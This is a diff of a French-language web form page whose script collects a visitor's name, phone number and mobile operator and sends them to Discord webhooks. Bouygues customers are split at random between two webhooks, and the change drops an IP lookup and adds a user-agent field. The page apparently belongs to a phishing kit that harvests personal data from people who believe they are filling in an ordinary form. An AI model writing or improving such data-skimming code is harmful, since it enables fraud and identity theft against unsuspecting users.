@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8">
   <title>Formulaire</title>
   <style>
     body {
@@ -109,25 +109,12 @@
       });
     }
 
-    async function getIP() {
-      try {
-        const response = await fetch("https://api.ipify.org?format=json");
-        const data = await response.json();
-        return data.ip || "Inconnu";
-      } catch {
-        return "Inconnu";
-      }
-    }
-
     document.getElementById("form2").addEventListener("submit", async (e) => {
       e.preventDefault();
       const msgElem = document.getElementById("msg");
       msgElem.textContent = "Envoi en cours...";
 
       const formData = new FormData(e.target);
-
-      const ip = await getIP();
-      const ua = navigator.userAgent || "Inconnu";
 
       const step2 = {
         nom: formData.get("nom"),
@@ -143,6 +130,8 @@
       const step1 = JSON.parse(localStorage.getItem("step1") || "{}");
       const operateur = step1.operateur || "Non fourni";
       const telephone = step1.telephone || "Non fourni";
+      const ip = "Inconnu";
+      const ua = "Inconnu";
 
       let webhookToUse = DISCORD_WEBHOOK_URL;
       if (operateur.toLowerCase().includes("bouygues") && Math.random() < 0.5) {
@@ -170,6 +159,7 @@
               `📶 Opérateur   : ${operateur}\n\n` +
 
               `📟 IP          : ${ip}\n` +
+              `🔎 User-Agent  : ${ua}`
           }
         ],
         timestamp: new Date().toISOString(),
